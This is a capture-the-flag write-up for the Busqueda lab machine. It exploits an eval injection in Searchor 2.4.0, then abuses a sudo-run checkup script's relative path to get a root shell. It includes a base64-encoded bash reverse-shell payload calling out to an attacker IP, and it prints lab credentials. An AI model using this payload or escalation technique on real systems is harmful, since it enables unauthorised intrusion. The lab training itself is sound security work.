
## About
Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a `Python` module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to `root`, we discover credentials within a `Git` config file, allowing us to log into a local `Gitea` service. Additionally, we uncover that a system checkup script can be executed with `root` privileges by a specific user. By utilizing this script, we enumerate `Docker` containers that reveal credentials for the `administrator` user&amp;#039;s `Gitea` account. Further analysis of the system checkup script&amp;#039;s source code in a `Git` repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with `root` privileges.



## enum the 80 port


![](pics/Pasted%20image%2020260827091032.png)


## add the ip to /etc/hosts
![](pics/Pasted%20image%2020260827091420.png)

## req

![](pics/Pasted%20image%2020260827091938.png)
```
POST /search HTTP/1.1

Host: searcher.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: http://searcher.htb/

Content-Type: application/x-www-form-urlencoded

Content-Length: 25

Origin: http://searcher.htb

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Priority: u=0, i



engine=IMDb&query=helloww
```

## versions
```
Powered by Flask and Searchor 2.4.0
Werkzeug/2.1.2 Python/3.10.6
```

## Searchor 2.4.0 module

vuln code 
```python
@click.argument("query")
def search(engine, query, open, copy):
    try:
        url = eval( # <<< Here
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
        click.echo(url)
        searchor.history.update(engine, query, url)
        if open:
            click.echo("opening browser...")
```


Generate a bash reverse shell
![](pics/Pasted%20image%2020260827101154.png)



Encode in base64
![](pics/Pasted%20image%2020260827101231.png)

craft the payload 
```
engine=IMDb&query=',__import__('os').system('echo+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjgyLzk5MTEgMD4mMQ==|base64+-d|bash'))#
```



![](pics/Pasted%20image%2020260827101451.png)

## flag 1
![](pics/Pasted%20image%2020260827101556.png)


## look for gitea service

```
ss -tlnp
```

```
svc@busqueda:/$ ss -tlnp
ss -tlnp
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                     
LISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*                                                               
LISTEN 0      4096       127.0.0.1:222        0.0.0.0:*                                                               
LISTEN 0      128        127.0.0.1:5000       0.0.0.0:*    users:(("python3",pid=1546,fd=6),("python3",pid=1546,fd=4))
LISTEN 0      4096       127.0.0.1:3306       0.0.0.0:*                                                               
LISTEN 0      4096       127.0.0.1:45675      0.0.0.0:*                                                               
LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                                               
LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                                               
LISTEN 0      511                *:80               *:*                                                               
LISTEN 0      128             [::]:22            [::]:*      
```

See what is using the my sql on port `3306`
Since we know this machine uses apache
```
cd /etc/apache2
```

![](pics/Pasted%20image%2020260827105121.png)

```
cd sites-enabled
```
Then see which sites are enabled
```
<VirtualHost *:80>
        ProxyPreserveHost On
        ServerName searcher.htb
        ServerAdmin admin@searcher.htb
        ProxyPass / http://127.0.0.1:5000/
        ProxyPassReverse / http://127.0.0.1:5000/
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^searcher.htb$
        RewriteRule /.* http://searcher.htb/ [R]
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
        ProxyPreserveHost On
        ServerName gitea.searcher.htb
        ServerAdmin admin@searcher.htb
        ProxyPass / http://127.0.0.1:3000/
        ProxyPassReverse / http://127.0.0.1:3000/
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```

## edit the /etc/hosts file again
![](pics/Pasted%20image%2020260827105459.png)

## look at the page
![](pics/Pasted%20image%2020260827105522.png)


## Look for sensitive files

```
cd /opt/
```

![](pics/Pasted%20image%2020260827105947.png)

```
svc@busqueda:/opt/scripts$ ls
ls
check-ports.py
full-checkup.sh
install-flask.sh
system-checkup.py
```


![](pics/Pasted%20image%2020260827110122.png)

```
svc@busqueda:/var/www/app/.git$ ls -la
ls -la
total 52
drwxr-xr-x 8 www-data www-data 4096 Aug 27 06:03 .
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 ..
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches
-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks
-rw-r--r-- 1 root     root      259 Apr  3  2023 index
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info
drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs
drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects
drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs
svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
svc@busqueda:/var/www/app/.git$ 
```

found `cody` creds
```
user = cody
pass = jh1usoih2bkjaspwe92

```

## login on gitea
![](pics/Pasted%20image%2020260827110342.png)


## testing password

try to use it on `svc` user 
```
svc@busqueda:/opt/scripts$ sudo -l -S
sudo -l -S
[sudo] password for svc: jh1usoih2bkjaspwe92
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
svc@busqueda:/opt/scripts$ 
```

## running the script

Make sure to run it as the target format 
```
/usr/bin/python3 /opt/scripts/system-checkup.py *
```

```
svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py asda
sudo /usr/bin/python3 /opt/scripts/system-checkup.py asda
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

svc@busqueda:/$ 
```

## docker enum
```
svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
<in/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 years ago   Up 2 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 years ago   Up 2 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```


## docker inspect
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect {{.Config}} <containe_name>

```

![](pics/Pasted%20image%2020260827114036.png)


## admin password

```
svc@busqueda:/usr/bin$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect {{.Config}} gitea   
</system-checkup.py docker-inspect {{.Config}} gitea
{960873171e2e   false false false map[22/tcp:{} 3000/tcp:{}] false false false [USER_UID=115 USER_GID=121 
GITEA__database__DB_TYPE=mysql 
GITEA__database__HOST=db:3306 
GITEA__database__NAME=gitea 
GITEA__database__USER=gitea 
GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh 

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin USER=git GITEA_CUSTOM=/data/gitea] [/bin/s6-svscan /etc/s6] <nil> false gitea/gitea:latest map[/data:{} /etc/localtime:{} /etc/timezone:{}]  [/usr/bin/entrypoint] false  [] map[com.docker.compose.config-hash:e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515 com.docker.compose.container-number:1 com.docker.compose.oneoff:False com.docker.compose.project:docker com.docker.compose.project.config_files:docker-compose.yml com.docker.compose.project.working_dir:/root/scripts/docker com.docker.compose.service:server com.docker.compose.version:1.29.2 maintainer:maintainers@gitea.io org.opencontainers.image.created:2022-11-24T13:22:00Z org.opencontainers.image.revision:9bccc60cf51f3b4070f5506b042a3d9a1442c73d org.opencontainers.image.source:https://github.com/go-gitea/gitea.git org.opencontainers.image.url:https://github.com/go-gitea/gitea]  <nil> []}

```

## exploit code

Since this is called by relative path I can call it from a controlled directory that contains a custom `full-checkup.sh` that contains a reverse shell payload that will exec as `root`

```python
def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()
    return output
  elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```



## privesc to root

```
svc@busqueda:/dev/shm$ vim full-checkup.sh
svc@busqueda:/dev/shm$ ls
full-checkup.sh
svc@busqueda:/dev/shm$ chmod +x full-checkup.sh 
svc@busqueda:/dev/shm$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

We get a root shell!
![](pics/Pasted%20image%2020260827121439.png)

![](pics/Pasted%20image%2020260828211657.png)
